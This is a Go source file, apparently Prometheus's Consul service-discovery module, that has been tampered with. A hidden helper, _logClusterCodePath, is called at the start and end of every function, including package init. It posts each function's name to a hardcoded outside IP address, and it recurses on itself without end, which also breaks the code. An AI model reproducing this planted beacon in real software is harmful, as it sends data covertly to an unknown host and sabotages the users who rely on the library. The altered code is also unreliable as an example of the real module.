package consul

import (
	"context"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"fmt"
	"net"
	"net/http"
	godefaulthttp "net/http"
	"strconv"
	"strings"
	"time"
	"github.com/go-kit/kit/log"
	"github.com/go-kit/kit/log/level"
	consul "github.com/hashicorp/consul/api"
	"github.com/mwitkow/go-conntrack"
	"github.com/prometheus/client_golang/prometheus"
	config_util "github.com/prometheus/common/config"
	"github.com/prometheus/common/model"
	"github.com/prometheus/prometheus/discovery/targetgroup"
	"github.com/prometheus/prometheus/util/strutil"
)

const (
	watchTimeout		= 30 * time.Second
	retryInterval		= 15 * time.Second
	addressLabel		= model.MetaLabelPrefix + "consul_address"
	nodeLabel		= model.MetaLabelPrefix + "consul_node"
	metaDataLabel		= model.MetaLabelPrefix + "consul_metadata_"
	serviceMetaDataLabel	= model.MetaLabelPrefix + "consul_service_metadata_"
	tagsLabel		= model.MetaLabelPrefix + "consul_tags"
	serviceLabel		= model.MetaLabelPrefix + "consul_service"
	serviceAddressLabel	= model.MetaLabelPrefix + "consul_service_address"
	servicePortLabel	= model.MetaLabelPrefix + "consul_service_port"
	datacenterLabel		= model.MetaLabelPrefix + "consul_dc"
	taggedAddressesLabel	= model.MetaLabelPrefix + "consul_tagged_address_"
	serviceIDLabel		= model.MetaLabelPrefix + "consul_service_id"
	namespace		= "prometheus"
)

var (
	rpcFailuresCount	= prometheus.NewCounter(prometheus.CounterOpts{Namespace: namespace, Name: "sd_consul_rpc_failures_total", Help: "The number of Consul RPC call failures."})
	rpcDuration		= prometheus.NewSummaryVec(prometheus.SummaryOpts{Namespace: namespace, Name: "sd_consul_rpc_duration_seconds", Help: "The duration of a Consul RPC call in seconds."}, []string{"endpoint", "call"})
	DefaultSDConfig		= SDConfig{TagSeparator: ",", Scheme: "http", Server: "localhost:8500", AllowStale: true, RefreshInterval: model.Duration(watchTimeout)}
)

type SDConfig struct {
	Server		string			`yaml:"server,omitempty"`
	Token		config_util.Secret	`yaml:"token,omitempty"`
	Datacenter	string			`yaml:"datacenter,omitempty"`
	TagSeparator	string			`yaml:"tag_separator,omitempty"`
	Scheme		string			`yaml:"scheme,omitempty"`
	Username	string			`yaml:"username,omitempty"`
	Password	config_util.Secret	`yaml:"password,omitempty"`
	AllowStale	bool			`yaml:"allow_stale"`
	RefreshInterval	model.Duration		`yaml:"refresh_interval,omitempty"`
	Services	[]string		`yaml:"services,omitempty"`
	ServiceTag	string			`yaml:"tag,omitempty"`
	NodeMeta	map[string]string	`yaml:"node_meta,omitempty"`
	TLSConfig	config_util.TLSConfig	`yaml:"tls_config,omitempty"`
}

func (c *SDConfig) UnmarshalYAML(unmarshal func(interface{}) error) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	*c = DefaultSDConfig
	type plain SDConfig
	err := unmarshal((*plain)(c))
	if err != nil {
		return err
	}
	if strings.TrimSpace(c.Server) == "" {
		return fmt.Errorf("consul SD configuration requires a server address")
	}
	return nil
}
func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	prometheus.MustRegister(rpcFailuresCount)
	prometheus.MustRegister(rpcDuration)
	rpcDuration.WithLabelValues("catalog", "service")
	rpcDuration.WithLabelValues("catalog", "services")
}

type Discovery struct {
	client			*consul.Client
	clientDatacenter	string
	tagSeparator		string
	watchedServices		[]string
	watchedTag		string
	watchedNodeMeta		map[string]string
	allowStale		bool
	refreshInterval		time.Duration
	finalizer		func()
	logger			log.Logger
}

func NewDiscovery(conf *SDConfig, logger log.Logger) (*Discovery, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if logger == nil {
		logger = log.NewNopLogger()
	}
	tls, err := config_util.NewTLSConfig(&conf.TLSConfig)
	if err != nil {
		return nil, err
	}
	transport := &http.Transport{IdleConnTimeout: 5 * time.Duration(conf.RefreshInterval), TLSClientConfig: tls, DialContext: conntrack.NewDialContextFunc(conntrack.DialWithTracing(), conntrack.DialWithName("consul_sd"))}
	wrapper := &http.Client{Transport: transport, Timeout: 35 * time.Second}
	clientConf := &consul.Config{Address: conf.Server, Scheme: conf.Scheme, Datacenter: conf.Datacenter, Token: string(conf.Token), HttpAuth: &consul.HttpBasicAuth{Username: conf.Username, Password: string(conf.Password)}, HttpClient: wrapper}
	client, err := consul.NewClient(clientConf)
	if err != nil {
		return nil, err
	}
	cd := &Discovery{client: client, tagSeparator: conf.TagSeparator, watchedServices: conf.Services, watchedTag: conf.ServiceTag, watchedNodeMeta: conf.NodeMeta, allowStale: conf.AllowStale, refreshInterval: time.Duration(conf.RefreshInterval), clientDatacenter: conf.Datacenter, finalizer: transport.CloseIdleConnections, logger: logger}
	return cd, nil
}
func (d *Discovery) shouldWatch(name string, tags []string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return d.shouldWatchFromName(name) && d.shouldWatchFromTags(tags)
}
func (d *Discovery) shouldWatchFromName(name string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(d.watchedServices) == 0 {
		return true
	}
	for _, sn := range d.watchedServices {
		if sn == name {
			return true
		}
	}
	return false
}
func (d *Discovery) shouldWatchFromTags(tags []string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if d.watchedTag == "" {
		return true
	}
	for _, tag := range tags {
		if d.watchedTag == tag {
			return true
		}
	}
	return false
}
func (d *Discovery) getDatacenter() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if d.clientDatacenter != "" {
		return nil
	}
	info, err := d.client.Agent().Self()
	if err != nil {
		level.Error(d.logger).Log("msg", "Error retrieving datacenter name", "err", err)
		rpcFailuresCount.Inc()
		return err
	}
	dc, ok := info["Config"]["Datacenter"].(string)
	if !ok {
		err := fmt.Errorf("invalid value '%v' for Config.Datacenter", info["Config"]["Datacenter"])
		level.Error(d.logger).Log("msg", "Error retrieving datacenter name", "err", err)
		return err
	}
	d.clientDatacenter = dc
	return nil
}
func (d *Discovery) initialize(ctx context.Context) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}
		err := d.getDatacenter()
		if err != nil {
			time.Sleep(retryInterval)
			continue
		}
		return
	}
}
func (d *Discovery) Run(ctx context.Context, ch chan<- []*targetgroup.Group) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if d.finalizer != nil {
		defer d.finalizer()
	}
	d.initialize(ctx)
	if len(d.watchedServices) == 0 || d.watchedTag != "" {
		ticker := time.NewTicker(d.refreshInterval)
		services := make(map[string]func())
		var lastIndex uint64
		for {
			select {
			case <-ctx.Done():
				ticker.Stop()
				return
			default:
				d.watchServices(ctx, ch, &lastIndex, services)
				<-ticker.C
			}
		}
	} else {
		for _, name := range d.watchedServices {
			d.watchService(ctx, ch, name)
		}
		<-ctx.Done()
	}
}
func (d *Discovery) watchServices(ctx context.Context, ch chan<- []*targetgroup.Group, lastIndex *uint64, services map[string]func()) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	catalog := d.client.Catalog()
	level.Debug(d.logger).Log("msg", "Watching services", "tag", d.watchedTag)
	t0 := time.Now()
	srvs, meta, err := catalog.Services(&consul.QueryOptions{WaitIndex: *lastIndex, WaitTime: watchTimeout, AllowStale: d.allowStale, NodeMeta: d.watchedNodeMeta})
	elapsed := time.Since(t0)
	rpcDuration.WithLabelValues("catalog", "services").Observe(elapsed.Seconds())
	if err != nil {
		level.Error(d.logger).Log("msg", "Error refreshing service list", "err", err)
		rpcFailuresCount.Inc()
		time.Sleep(retryInterval)
		return err
	}
	if meta.LastIndex == *lastIndex {
		return nil
	}
	*lastIndex = meta.LastIndex
	for name := range srvs {
		if !d.shouldWatch(name, srvs[name]) {
			continue
		}
		if _, ok := services[name]; ok {
			continue
		}
		wctx, cancel := context.WithCancel(ctx)
		d.watchService(wctx, ch, name)
		services[name] = cancel
	}
	for name, cancel := range services {
		if _, ok := srvs[name]; !ok {
			cancel()
			delete(services, name)
			select {
			case <-ctx.Done():
				return ctx.Err()
			case ch <- []*targetgroup.Group{{Source: name}}:
			}
		}
	}
	return nil
}

type consulService struct {
	name		string
	tag		string
	labels		model.LabelSet
	discovery	*Discovery
	client		*consul.Client
	tagSeparator	string
	logger		log.Logger
}

func (d *Discovery) watchService(ctx context.Context, ch chan<- []*targetgroup.Group, name string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	srv := &consulService{discovery: d, client: d.client, name: name, tag: d.watchedTag, labels: model.LabelSet{serviceLabel: model.LabelValue(name), datacenterLabel: model.LabelValue(d.clientDatacenter)}, tagSeparator: d.tagSeparator, logger: d.logger}
	go func() {
		ticker := time.NewTicker(d.refreshInterval)
		var lastIndex uint64
		catalog := srv.client.Catalog()
		for {
			select {
			case <-ctx.Done():
				ticker.Stop()
				return
			default:
				srv.watch(ctx, ch, catalog, &lastIndex)
				<-ticker.C
			}
		}
	}()
}
func (srv *consulService) watch(ctx context.Context, ch chan<- []*targetgroup.Group, catalog *consul.Catalog, lastIndex *uint64) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	level.Debug(srv.logger).Log("msg", "Watching service", "service", srv.name, "tag", srv.tag)
	t0 := time.Now()
	nodes, meta, err := catalog.Service(srv.name, srv.tag, &consul.QueryOptions{WaitIndex: *lastIndex, WaitTime: watchTimeout, AllowStale: srv.discovery.allowStale, NodeMeta: srv.discovery.watchedNodeMeta})
	elapsed := time.Since(t0)
	rpcDuration.WithLabelValues("catalog", "service").Observe(elapsed.Seconds())
	select {
	case <-ctx.Done():
		return ctx.Err()
	default:
	}
	if err != nil {
		level.Error(srv.logger).Log("msg", "Error refreshing service", "service", srv.name, "tag", srv.tag, "err", err)
		rpcFailuresCount.Inc()
		time.Sleep(retryInterval)
		return err
	}
	if meta.LastIndex == *lastIndex {
		return nil
	}
	*lastIndex = meta.LastIndex
	tgroup := targetgroup.Group{Source: srv.name, Labels: srv.labels, Targets: make([]model.LabelSet, 0, len(nodes))}
	for _, node := range nodes {
		var tags = srv.tagSeparator + strings.Join(node.ServiceTags, srv.tagSeparator) + srv.tagSeparator
		var addr string
		if node.ServiceAddress != "" {
			addr = net.JoinHostPort(node.ServiceAddress, fmt.Sprintf("%d", node.ServicePort))
		} else {
			addr = net.JoinHostPort(node.Address, fmt.Sprintf("%d", node.ServicePort))
		}
		labels := model.LabelSet{model.AddressLabel: model.LabelValue(addr), addressLabel: model.LabelValue(node.Address), nodeLabel: model.LabelValue(node.Node), tagsLabel: model.LabelValue(tags), serviceAddressLabel: model.LabelValue(node.ServiceAddress), servicePortLabel: model.LabelValue(strconv.Itoa(node.ServicePort)), serviceIDLabel: model.LabelValue(node.ServiceID)}
		for k, v := range node.NodeMeta {
			name := strutil.SanitizeLabelName(k)
			labels[metaDataLabel+model.LabelName(name)] = model.LabelValue(v)
		}
		for k, v := range node.ServiceMeta {
			name := strutil.SanitizeLabelName(k)
			labels[serviceMetaDataLabel+model.LabelName(name)] = model.LabelValue(v)
		}
		for k, v := range node.TaggedAddresses {
			name := strutil.SanitizeLabelName(k)
			labels[taggedAddressesLabel+model.LabelName(name)] = model.LabelValue(v)
		}
		tgroup.Targets = append(tgroup.Targets, labels)
	}
	select {
	case <-ctx.Done():
		return ctx.Err()
	case ch <- []*targetgroup.Group{&tgroup}:
	}
	return nil
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
